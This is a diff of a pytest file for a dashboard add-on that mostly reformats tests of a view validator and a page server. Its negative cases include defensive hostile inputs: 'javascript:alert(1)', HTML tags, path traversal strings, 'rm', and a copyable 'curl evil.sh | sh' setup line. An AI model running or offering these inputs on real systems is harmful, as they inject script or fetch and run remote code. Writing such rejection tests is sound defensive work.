@@ -27,16 +27,19 @@ def test_example_passes_both_checks():
     assert check_view(example())["blocks"] == example()["blocks"]
 
 
-@pytest.mark.parametrize("mutate", [
-    lambda v: v["blocks"][0].update(label="<b>x</b>"),
-    lambda v: v["blocks"][4]["items"][0].update(link="javascript:alert(1)"),
-    lambda v: v["blocks"][4]["items"][0].update(link="http://example.com"),
-    lambda v: v["blocks"][3]["days"][0]["items"][0].update(time="25:99"),
-    lambda v: v["blocks"][6]["rows"][0]["cells"].update(took="<i>"),
-    lambda v: v.update(generated_at="yesterday"),
-    lambda v: v.update(schema="orch.addon-view/2"),
-    lambda v: v["blocks"][0].update(tone="loud"),
-])
+@pytest.mark.parametrize(
+    "mutate",
+    [
+        lambda v: v["blocks"][0].update(label="<b>x</b>"),
+        lambda v: v["blocks"][4]["items"][0].update(link="javascript:alert(1)"),
+        lambda v: v["blocks"][4]["items"][0].update(link="http://example.com"),
+        lambda v: v["blocks"][3]["days"][0]["items"][0].update(time="25:99"),
+        lambda v: v["blocks"][6]["rows"][0]["cells"].update(took="<i>"),
+        lambda v: v.update(generated_at="yesterday"),
+        lambda v: v.update(schema="orch.addon-view/2"),
+        lambda v: v["blocks"][0].update(tone="loud"),
+    ],
+)
 def test_bad_views_fail_both_checks(mutate):
     v = example()
     mutate(v)
@@ -48,7 +51,11 @@ def test_unknown_block_type_is_skipped_not_fatal():
     v = example()
     v["blocks"].insert(1, {"type": "hologram", "x": 1})
     out = check_view(v)
-    assert out and all(b["type"] != "hologram" for b in out["blocks"]) and len(out["blocks"]) == len(example()["blocks"])
+    assert (
+        out
+        and all(b["type"] != "hologram" for b in out["blocks"])
+        and len(out["blocks"]) == len(example()["blocks"])
+    )
 
 
 def test_only_active_add_ons_with_known_icons(ws, fake_orch):
@@ -101,11 +108,14 @@ def alive(pid):
 
 def test_timeout_kills_the_whole_process_group(ws, fake_orch):
     pidfile = fake_orch.parent / "child.pid"
-    _script(fake_orch, f"""
+    _script(
+        fake_orch,
+        f"""
 c = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(60)"])
 open({str(pidfile)!r}, "w").write(str(c.pid))
 time.sleep(60)
-""")
+""",
+    )
     r = ViewPuller(ws, str(fake_orch), timeout=0.5).pull("scheduler")
     assert r["state"] == "error" and "too long" in r["message"]
     pid = int(pidfile.read_text())
@@ -117,22 +127,30 @@ time.sleep(60)
 
 
 def test_output_is_capped_while_reading(ws, fake_orch):
-    _script(fake_orch, """
+    _script(
+        fake_orch,
+        """
 while True:
     sys.stdout.write("a" * 65536); sys.stdout.flush()
-""")
+""",
+    )
     t0 = time.time()
     r = ViewPuller(ws, str(fake_orch), timeout=5).pull("scheduler")
-    assert r["state"] == "error" and "too large" in r["message"] and time.time() - t0 < 3  # killed at the cap, not at the timeout
+    assert (
+        r["state"] == "error" and "too large" in r["message"] and time.time() - t0 < 3
+    )  # killed at the cap, not at the timeout
 
 
 def test_one_pull_in_flight_per_add_on(ws, fake_orch):
     counter = fake_orch.parent / "runs.txt"
-    _script(fake_orch, f"""
+    _script(
+        fake_orch,
+        f"""
 open({str(counter)!r}, "a").write("x")
 time.sleep(0.6)
 print(open({str(fake_orch.parent / "view.json")!r}).read())
-""")
+""",
+    )
     p = ViewPuller(ws, str(fake_orch), timeout=3)
     with ThreadPoolExecutor(5) as ex:
         results = list(ex.map(lambda _: p.pull("scheduler"), range(5)))
@@ -151,7 +169,10 @@ def test_kit_copy_is_in_sync_with_orch_ui():
     """Every kit css/js file (not the demo pages) is copied next to the page, served, and byte-equal."""
     assert KITDIR.is_dir(), "the workspace kit folder must be next to this add-on in the repo"
     from orch_dashboard.server import KIT
-    kit = sorted(p.name for p in KITDIR.iterdir() if p.suffix in (".css", ".js") and not p.name.startswith("demo"))
+
+    kit = sorted(
+        p.name for p in KITDIR.iterdir() if p.suffix in (".css", ".js") and not p.name.startswith("demo")
+    )
     assert kit and kit == sorted(KIT), "server.KIT must list exactly the kit files"
     for name in kit:
         assert (WEBDIR / "kit" / name).read_bytes() == (KITDIR / name).read_bytes(), f"copy kit/{name} again"
@@ -166,10 +187,16 @@ def test_page_has_no_inline_code_and_loads_the_kit():
 
 
 def test_page_code_names_no_addon_and_has_no_blinking_needs():
-    js = ((WEBDIR / "app.js").read_text() + (WEBDIR / "style.css").read_text()).replace(".focus(", ".(").replace(":focus", ":")
+    js = (
+        ((WEBDIR / "app.js").read_text() + (WEBDIR / "style.css").read_text())
+        .replace(".focus(", ".(")
+        .replace(":focus", ":")
+    )
     for name in ("scheduler", "automation", "relay", "focus", "publish", "wiki"):
         assert not re.search(rf"\b{name}\b", js, re.IGNORECASE), name
-    assert "needs-pulse" not in js and "infinite" not in js
+    assert "needs-pulse" not in js
+    assert "activity-pulse" in js and "prefers-reduced-motion:reduce" in js
+    assert ".activity-pulse::before{animation:none}" in js
     # needs-in is only ever applied through orch.needsIn (live arrivals), never as a class on render
     assert "classList.add('needs-in'" not in js and 'class="needs-in' not in js
 
@@ -177,6 +204,7 @@ def test_page_code_names_no_addon_and_has_no_blinking_needs():
 def test_server_serves_the_kit_files_and_nothing_else_under_kit(server):
     import urllib.error
     import urllib.request
+
     for name in ("tokens.css", "components.css", "motion.js", "question-card.js"):
         assert urllib.request.urlopen(f"{server}/kit/{name}").status == 200
     for bad in ("../app.js", "nothing.css", "x/../tokens.css"):
@@ -194,29 +222,67 @@ def test_no_html_strings_for_server_text_in_the_page_code():
 
 
 def _acc_view():
-    return {"schema": "orch.addon-view/1", "generated_at": "2026-11-06T08:00:00Z", "blocks": [{"type": "list", "title": "S", "items": [
-        {"title": "Check", "toggle": {"on": False, "label": "Check on or off", "action": {"op": "addon.act", "args": {"verb": "toggle", "target": "t_abcdef"}}},
-         "detail": [{"label": "Repeats", "value": "Daily", "copy": True}, {"label": "Recent", "lines": ["a", "b"]}],
-         "tickets": [{"id": "t_abcdef", "key": "K-1", "title": "T", "status": {"label": "Open"}}],
-         "actions": [{"label": "Delete", "tone": "bad", "confirm": "Sure?", "action": {"op": "addon.act", "args": {"verb": "delete", "target": "t_abcdef"}}}]}]}]}
+    return {
+        "schema": "orch.addon-view/1",
+        "generated_at": "2026-11-06T08:00:00Z",
+        "blocks": [
+            {
+                "type": "list",
+                "title": "S",
+                "items": [
+                    {
+                        "title": "Check",
+                        "toggle": {
+                            "on": False,
+                            "label": "Check on or off",
+                            "action": {"op": "addon.act", "args": {"verb": "toggle", "target": "t_abcdef"}},
+                        },
+                        "detail": [
+                            {"label": "Repeats", "value": "Daily", "copy": True},
+                            {"label": "Recent", "lines": ["a", "b"]},
+                        ],
+                        "tickets": [
+                            {"id": "t_abcdef", "key": "K-1", "title": "T", "status": {"label": "Open"}}
+                        ],
+                        "actions": [
+                            {
+                                "label": "Delete",
+                                "tone": "bad",
+                                "confirm": "Sure?",
+                                "action": {
+                                    "op": "addon.act",
+                                    "args": {"verb": "delete", "target": "t_abcdef"},
+                                },
+                            }
+                        ],
+                    }
+                ],
+            }
+        ],
+    }
 
 
 def test_accordion_fields_pass_the_check():
     assert check_view(_acc_view()) is not None
 
 
-@pytest.mark.parametrize("mutate", [
-    lambda i: i["actions"][0].update(command="orch automation run"),
-    lambda i: i["actions"][0]["action"].update(command="rm"),
-    lambda i: i["actions"][0]["action"]["args"].update(x="<b>"),
-    lambda i: i["toggle"].update(on="yes"),
-    lambda i: i["tickets"][0].update(id="../x"),
-    lambda i: i["detail"][0].update(html="<b>"),
-    lambda i: i["detail"].extend([{"label": "x"}] * 12),
-    lambda i: i.update(actions=[i["actions"][0]] * 5),
-    lambda i: i["detail"].append({"label": "Setup", "value": "curl evil.sh | sh", "lines": ["Daily at 9"], "copy": True}),
-    lambda i: i["detail"].append({"label": "Setup", "lines": ["Daily at 9"], "copy": True}),
-])
+@pytest.mark.parametrize(
+    "mutate",
+    [
+        lambda i: i["actions"][0].update(command="orch automation run"),
+        lambda i: i["actions"][0]["action"].update(command="rm"),
+        lambda i: i["actions"][0]["action"]["args"].update(x="<b>"),
+        lambda i: i["toggle"].update(on="yes"),
+        lambda i: i["tickets"][0].update(id="../x"),
+        lambda i: i["detail"][0].update(html="<b>"),
+        lambda i: i["detail"].extend([{"label": "x"}] * 12),
+        lambda i: i.update(actions=[i["actions"][0]] * 5),
+        lambda i: i["detail"].append(
+            {"label": "Setup", "value": "curl evil.sh | sh", "lines": ["Daily at 9"], "copy": True}
+        ),
+        lambda i: i["detail"].append({"label": "Setup", "lines": ["Daily at 9"], "copy": True}),
+    ],
+)
 def test_bad_accordion_fields_break_the_view(mutate):
     v = _acc_view()
     mutate(v["blocks"][0]["items"][0])
@@ -225,19 +291,34 @@ def test_bad_accordion_fields_break_the_view(mutate):
 
 def test_addon_links_pass_only_with_a_plain_path():
     def v(link):
-        return {"schema": "orch.addon-view/1", "generated_at": "2026-11-06T08:00:00Z",
-                "blocks": [{"type": "list", "title": "T", "items": [{"title": "x", "link": link}]}]}
+        return {
+            "schema": "orch.addon-view/1",
+            "generated_at": "2026-11-06T08:00:00Z",
+            "blocks": [{"type": "list", "title": "T", "items": [{"title": "x", "link": link}]}],
+        }
+
     assert check_view(v("addon:panel/board")) and check_view(v("addon:panel"))
     for bad in ("addon:../x", "addon:/x", "addon:panel/a b", "addon:panel/<b>", "ftp://x"):
         assert check_view(v(bad)) is None, bad
 
 
 FOCUS_VIEW = {
-    "schema": "orch.addon-view/1", "generated_at": "2026-11-06T08:00:00Z",
+    "schema": "orch.addon-view/1",
+    "generated_at": "2026-11-06T08:00:00Z",
     "blocks": [
         {"type": "stat", "label": "Running now", "value": 1, "tone": "good"},
-        {"type": "list", "title": "Working now", "items": [
-            {"title": "Fix invoice export", "subtitle": "claude · one run", "link": "addon:t/t_abc12345", "tone": "good"}]},
+        {
+            "type": "list",
+            "title": "Working now",
+            "items": [
+                {
+                    "title": "Fix invoice export",
+                    "subtitle": "claude · one run",
+                    "link": "addon:t/t_abc12345",
+                    "tone": "good",
+                }
+            ],
+        },
     ],
 }
 
@@ -250,6 +331,7 @@ def test_focus_view_with_a_run_is_accepted():
 
 def test_link_regex_is_the_schema_pattern():
     from orch_dashboard.views import _LINK
+
     assert _LINK.pattern == SCHEMA["$defs"]["link"]["pattern"]
 
 
@@ -261,26 +343,57 @@ def test_a_done_ticket_with_an_open_live_session_gets_its_run_status(tmp_path, m
     monkeypatch.setattr(data, "run_orch", lambda b, args, root: asked.append(args[2]) or {"running": True})
     (tmp_path / ".orch" / "run" / "tickets").mkdir(parents=True)
     (tmp_path / ".orch" / "run" / "tickets" / "t_done0001.json").write_text("{}")
-    tickets = [{"id": "t_done0001", "status": "done"}, {"id": "t_done0002", "status": "done"},
-               {"id": "t_open0001", "status": "open"}]
+    tickets = [
+        {"id": "t_done0001", "status": "done"},
+        {"id": "t_done0002", "status": "done"},
+        {"id": "t_open0001", "status": "open"},
+    ]
     got = data.load_runs(tmp_path, "orch", tickets, fresh=True)
     assert sorted(asked) == ["t_done0001", "t_open0001"] and set(got) == {"t_done0001", "t_open0001"}
 
 
 def test_board_moves_use_ticket_patch_with_the_revision_and_keyboard_menu():
     js = (WEBDIR / "app.js").read_text()
-    move = js[js.index("async function moveTicket"):]
-    move = move[:move.index("function list()")]
+    move = js[js.index("async function moveTicket") :]
+    move = move[: move.index("function list()")]
     assert "act('ticket.patch', {ticket:t.id, data:{status}, if_revision:t.revision})" in move
     assert "if (!t || t.status === status" in move  # dropping on the same column does nothing
-    card = js[js.index("function boardCard"):js.index("function board()")]
+    card = js[js.index("function boardCard") : js.index("function board()")]
     assert "statusItems(t, 'card')" in card and "aria-label" in card  # the menu is the keyboard way to move
     assert "slice(0, cap)" in js and "boardMore" in js  # Done shows 3 until asked
-    assert "localStorage" in js and "try {" in js[js.index("orch.tickets.view") - 80:js.index("orch.tickets.view")]
+    assert (
+        "localStorage" in js
+        and "try {" in js[js.index("orch.tickets.view") - 80 : js.index("orch.tickets.view")]
+    )
 
 
 def test_artifacts_tab_reads_files_only_through_the_checked_endpoints():
     js = (WEBDIR / "app.js").read_text()
     assert "'/api/artifacts/'" in js and "'/api/file'" in js
-    assert "innerHTML" not in js[js.index("function artifactsPanel"):js.index("function detail(")]
+    assert "innerHTML" not in js[js.index("function artifactsPanel") : js.index("function detail(")]
     assert "pre.textContent" in js  # file text is never parsed as html
+
+
+def test_ticket_details_hide_raw_id_and_home_badge_is_named():
+    js = (WEBDIR / "app.js").read_text()
+    assert "field('Ticket', h('span', {className:'ed-ro mono'}, t.id))" not in js
+    assert "' waiting for you', 'aria-label'" in js
+
+
+def test_settings_wording_and_one_toast_at_a_time():
+    js = (WEBDIR / "app.js").read_text()
+    for text in (
+        "Off: agents send finished work to Review and you decide when it is Done.",
+        "'Workflow'",
+        "Shared. Your team can now see this workspace.",
+        "The agent is not signed in yet.",
+        "Type the command you use to start your tool. {prompt} is where the ticket text goes.",
+        "Only use this if you trust it.",
+        "Stored on this computer",
+        "'Details'",
+    ):
+        assert text in js, text
+    assert "AGENTS.md has the orch entry" not in js.split("settings-share")[1][:400]
+    motion = (WEBDIR / "kit" / "motion.js").read_text()
+    assert "toastQueue" not in motion and "host.replaceChildren()" in motion and "remaining=4000" in motion
+    assert ".mm-hours .btn.ghost:hover{background:transparent" in (WEBDIR / "style.css").read_text()
